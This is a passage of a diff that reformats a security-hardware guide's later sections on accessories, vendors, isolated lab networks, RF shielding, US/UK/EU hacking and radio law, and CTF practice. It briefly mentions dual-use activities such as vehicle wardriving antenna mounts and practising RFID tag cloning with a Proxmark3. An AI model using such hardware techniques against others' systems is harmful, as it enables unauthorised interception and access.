+Proxmark3 RDV4 cases:
 - Custom form-fitting enclosures
 - Antenna compartments for LF/HF coils
 - Clip-on designs for one-handed operation
 - Available on Thingiverse and Printables
 
-**Flipper Zero accessories:**
+Flipper Zero accessories:
 - Extended battery cases (6000+ mAh)
 - WiFi Dev Board mounting plates
 - GPIO header covers
 - Rubber bumper protectors
 
-**Probe and test clip holders:**
+Probe and test clip holders:
 - IC clip holders for SPI flash probing
 - SOIC8/SOIC16 clip positioning jigs
 - PCB third-hand mounts
 - SMA connector organizers for RF cable management
 
-**Antenna mounts:**
+Antenna mounts:
 - Directional Yagi holders for LoRa distance testing
 - Magnetic dipole mounts for vehicle-mounted wardriving
 - Near-field antenna fixtures for RFID testing at fixed height
 
 ### 9.5 Community Resources
 
-**Online Communities:**
+Online Communities:
 
 | Resource | Type | Focus |
 |----------|------|-------|
@@ -1872,7 +1872,7 @@ The maker community has published numerous open-source designs for security hard
 | `r/RTLSDR` | Reddit | Software-defined radio community |
 | `r/flipperzero` | Reddit | Flipper Zero community |
 
-**Conferences:**
+Conferences:
 
 | Conference | Location | Hardware Focus |
 |-----------|----------|---------------|
@@ -1882,17 +1882,17 @@ The maker community has published numerous open-source designs for security hard
 | CCC (Chaos Communication Congress) | Germany | Camp hardware workshops |
 | Maker Faire | Various | Educational hardware making |
 
-**DEF CON Hardware Hacking Village:** Annual hands-on workshop area with soldering stations, hardware puzzle challenges, and talks on embedded security. Open to all badge holders.
+DEF CON Hardware Hacking Village: Annual hands-on workshop area with soldering stations, hardware puzzle challenges, and talks on embedded security. Open to all badge holders.
 
-**Tindie:** `tindie.com` — marketplace for maker/small-producer hardware including custom security tools, RFID research hardware, and SDR accessories.
+Tindie: `tindie.com` — marketplace for maker/small-producer hardware including custom security tools, RFID research hardware, and SDR accessories.
 
-**Procurement guidance:**
-- `hak5.org` — official Hak5 store
-- `greatscottgadgets.com` — HackRF, Ubertooth, GreatFET
-- `flipperzero.one` — official Flipper Zero store
-- `proxmark.io` / `lab401.com` — Proxmark3 resellers
-- `hakshop.com` — authorized reseller for Hak5 products
-- **AliExpress counterfeit warning:** Many "HackRF One" and "Proxmark3" listings on AliExpress are non-functional counterfeits. Verify seller reputation carefully.
+Procurement guidance:
+- `hak5.org`: official Hak5 store
+- `greatscottgadgets.com`: HackRF, Ubertooth, GreatFET
+- `flipperzero.one`: official Flipper Zero store
+- `proxmark.io` / `lab401.com`: Proxmark3 resellers
+- `hakshop.com`: authorized reseller for Hak5 products
+- AliExpress counterfeit warning: Many "HackRF One" and "Proxmark3" listings on AliExpress are non-functional counterfeits. Verify seller reputation carefully.
 
 ---
 ## 10. Lab Setup, Legal & Community
@@ -1901,7 +1901,7 @@ Responsible security research requires a properly isolated lab environment, thor
 
 ### 10.1 Lab Network Design
 
-**Isolated testing VLAN architecture:**
+Isolated testing VLAN architecture:
 
 ```
 Internet
@@ -1923,14 +1923,14 @@ Internet
             +-- Storage server (captures, logs)
 ```
 
-**Key isolation requirements:**
-- Security lab VLAN has **no default internet route** — all outbound attempts should fail or route to honeypot
+Key isolation requirements:
+- Security lab VLAN has no default internet route: all outbound attempts should fail or route to honeypot
 - Separate AP on isolated SSID for wireless tool testing (never using production WiFi)
 - Network tap (Throwing Star or managed switch SPAN port) for passive traffic monitoring
 - VPN gateway for out-of-band management access to lab
 - Capture storage should be on isolated NAS, not internet-connected system
 
-**pfSense/OPNsense firewall rules for lab VLAN:**
+pfSense/OPNsense firewall rules for lab VLAN:
 ```
 # Block all lab -> internet traffic
 Block * * LAN:net WAN:any * *
@@ -1940,7 +1940,7 @@ Pass * * LAN:net MGMT:net 514 *   # Syslog
 Pass * * LAN:net MGMT:net 9000 *  # Elasticsearch
 ```
 
-**Always-on monitoring stack:**
+Always-on monitoring stack:
 ```bash
 # Zeek on tap interface
 zeekctl deploy
@@ -1955,9 +1955,9 @@ suricata -c /etc/suricata/suricata.yaml -i tap0 -D
 
 ### 10.2 RF Isolation
 
-**Why RF isolation matters:** RF testing devices (HackRF, Flipper, YARD Stick) can unintentionally transmit outside the test environment, potentially interfering with neighboring systems, ISM-band devices, or licensed radio services.
+Why RF isolation matters: RF testing devices (HackRF, Flipper, YARD Stick) can unintentionally transmit outside the test environment, potentially interfering with neighboring systems, ISM-band devices, or licensed radio services.
 
-**Faraday enclosure options:**
+Faraday enclosure options:
 
 | Option | Cost | Effectiveness | Notes |
 |--------|------|---------------|-------|
@@ -1966,7 +1966,7 @@ suricata -c /etc/suricata/suricata.yaml -i tap0 -D
 | Window screen + copper tape | $30-80 | Moderate (20-40 dB) | Budget option |
 | Commercial RF shielded box | $500+ | Excellent (80-100 dB) | Best for consistent testing |
 
-**Building a DIY Faraday cage:**
+Building a DIY Faraday cage:
 ```
 Materials:
 - Aluminum window screen (fine mesh, 0.5mm openings or smaller)
@@ -1983,7 +1983,7 @@ Construction:
 6. Verify with HackRF: signal should be undetectable outside
 ```
 
-**Attenuator chain for bench testing:**
+Attenuator chain for bench testing:
 ```
 HackRF TX --[30dB atten]--[10dB atten]-- Test Device
                                               |
@@ -1994,59 +1994,59 @@ HackRF TX --[30dB atten]--[10dB atten]-- Test Device
 # Add SMA gender changers as needed for N<->SMA, RP-SMA<->SMA mismatches
 ```
 
-**Coaxial (wired) RF testing:**
+Coaxial (wired) RF testing:
 - For RFID (Proxmark3, Flipper), near-field coupling eliminates OTA transmission entirely
 - For SDR testing, RF-over-coax with 20+ dB in-line attenuation protects sensitive receivers
 
 ### 10.3 Legal Framework
 
-**United States:**
+United States:
 
-**Computer Fraud and Abuse Act (18 U.S.C. 1030):**
+Computer Fraud and Abuse Act (18 U.S.C. 1030):
 - Prohibits unauthorized access to computer systems
-- **Authorization is the key legal boundary** — explicit written permission is required for any testing on systems you do not own
+- Authorization is the key legal boundary: explicit written permission is required for any testing on systems you do not own
 - Penalties: up to 10 years federal imprisonment for first offense, up to 20 for subsequent
-- Covers computers, networks, devices — extremely broadly interpreted
+- Covers computers, networks, devices: extremely broadly interpreted
 
-**FCC Regulations:**
-- **Part 15:** Unlicensed device limits. ISM band devices (WiFi, Bluetooth, 433 MHz) must comply with power limits. Intentional interference is prohibited regardless of license.
-- **Part 97 (Amateur Radio Service):** Licensed amateur operators (Technician, General, or Amateur Extra class) may transmit on specified amateur bands. Required for legal transmission with HackRF/YARD Stick at power above Part 15 limits.
-- **Prohibited:** Broadcasting, using intentional interference, operating without license on licensed bands.
+FCC Regulations:
+- Part 15: Unlicensed device limits. ISM band devices (WiFi, Bluetooth, 433 MHz) must comply with power limits. Intentional interference is prohibited regardless of license.
+- Part 97 (Amateur Radio Service): Licensed amateur operators (Technician, General, or Amateur Extra class) may transmit on specified amateur bands. Required for legal transmission with HackRF/YARD Stick at power above Part 15 limits.
+- Prohibited: Broadcasting, using intentional interference, operating without license on licensed bands.
 
-**Electronic Communications Privacy Act (ECPA):**
+Electronic Communications Privacy Act (ECPA):
 - Prohibits interception of electronic communications without authorization
 - Includes WiFi traffic, Bluetooth, cellular communications
 - Authorization from network owner required for packet capture
 
-**State wiretapping laws:**
+State wiretapping laws:
 - Many states have additional restrictions beyond federal law
 - Some states require all-party consent for recording
 
-**United Kingdom:**
+United Kingdom:
 
-**Computer Misuse Act 1990:**
+Computer Misuse Act 1990:
 - Section 1: Unauthorized access (up to 2 years)
 - Section 2: Unauthorized access with intent (up to 5 years)
 - Section 3: Unauthorized modification (up to 10 years)
 - Section 3ZA: Unauthorized acts causing serious damage (up to life imprisonment)
-- Authorization is the legal boundary — written permission essential
+- Authorization is the legal boundary: written permission essential
 
-**European Union:**
+European Union:
 
-**NIS2 Directive (Network and Information Security):**
+NIS2 Directive (Network and Information Security):
 - Requires robust cybersecurity measures for essential services
 - Mandates vulnerability disclosure reporting
 - Penalizes organizations for inadequate security controls
 - Does not authorize unauthorized testing
 
-**Authorization requirements (universal):**
+Authorization requirements (universal):
 - Written authorization from the system owner before any testing
-- Scope definition — specific IP ranges, systems, and time windows
+- Scope definition: specific IP ranges, systems, and time windows
 - Emergency stop procedure agreed in advance
 - Liability clause in engagement contract
 - Evidence of authorization to carry during testing
 
-**Safe harbors:**
+Safe harbors:
 - Testing your own systems/networks (home lab, owned infrastructure)
 - CTF competitions (authorized by organizers)
 - Bug bounty programs (within defined scope)
@@ -2054,7 +2054,7 @@ HackRF TX --[30dB atten]--[10dB atten]-- Test Device
 
 ### 10.4 CTF and Practice Environments
 
-**Purpose-built vulnerable environments** allow skill development without legal risk:
+Purpose-built vulnerable environments allow skill development without legal risk:
 
 | Platform | Type | Focus |
 |----------|------|-------|
@@ -2066,20 +2066,20 @@ HackRF TX --[30dB atten]--[10dB atten]-- Test Device
 | VulnHub | Local VM | Downloadable vulnerable VMs |
 | PentesterLab | Online | Web + network focused |
 
-**Wireless/RF practice:**
+Wireless/RF practice:
 - Hack The Box has wireless CTF challenges
 - SDR challenges at various CTF events (picoCTF, DEF CON CTF)
 - Build personal lab with intentionally vulnerable target devices
 - Proxmark3 practice kit: buy blank T5577 and EM4100 tags for cloning practice
 
-**Hak5 community guidelines:**
+Hak5 community guidelines:
 - All Hak5 tools are sold for authorized testing only
 - Hak5 ToS requires users to obtain authorization before testing on others' systems
 - Community forum at `community.hak5.org` for legitimate support questions
 
 ### 10.5 Procurement and Conference Calendar
 
-**Primary vendors:**
+Primary vendors:
 
 | Vendor | Products | URL |
 |--------|----------|-----|
@@ -2091,7 +2091,7 @@ HackRF TX --[30dB atten]--[10dB atten]-- Test Device
 | HakShop | Hak5 authorized reseller | hakshop.com |
 | Tindie | Maker hardware marketplace | tindie.com |
 
-**Annual security conference calendar:**
+Annual security conference calendar:
 
 | Conference | Month | Hardware Focus |
 |-----------|-------|---------------|
@@ -2108,17 +2108,17 @@ HackRF TX --[30dB atten]--[10dB atten]-- Test Device
 
 ## Additional References
 
-- **Hak5 Documentation:** `docs.hak5.org`
-- **Great Scott Gadgets Wiki:** `greatscottgadgets.com/hackrf/one/`
-- **Flipper Zero Documentation:** `docs.flipper.net`
-- **Proxmark3 Wiki:** `github.com/RfidResearchGroup/proxmark3/wiki`
-- **Meshtastic Documentation:** `meshtastic.org/docs/`
-- **GNU Radio Wiki:** `wiki.gnuradio.org`
-- **RTL-SDR Blog:** `rtl-sdr.com`
-- **ARRL (American Radio Relay League):** `arrl.org` — amateur radio licensing
-- **FCC License Search:** `wireless.fcc.gov/uls/`
-- **NVD CVE Database:** `nvd.nist.gov` — vulnerability reference
-- **MITRE ATT&CK:** `attack.mitre.org` — adversarial tactic reference
+- Hak5 Documentation: `docs.hak5.org`
+- Great Scott Gadgets Wiki: `greatscottgadgets.com/hackrf/one/`
+- Flipper Zero Documentation: `docs.flipper.net`
+- Proxmark3 Wiki: `github.com/RfidResearchGroup/proxmark3/wiki`
+- Meshtastic Documentation: `meshtastic.org/docs/`
+- GNU Radio Wiki: `wiki.gnuradio.org`
+- RTL-SDR Blog: `rtl-sdr.com`
+- ARRL (American Radio Relay League): `arrl.org`: amateur radio licensing
+- FCC License Search: `wireless.fcc.gov/uls/`
+- NVD CVE Database: `nvd.nist.gov`: vulnerability reference
+- MITRE ATT&CK: `attack.mitre.org`: adversarial tactic reference
 
 ---
 
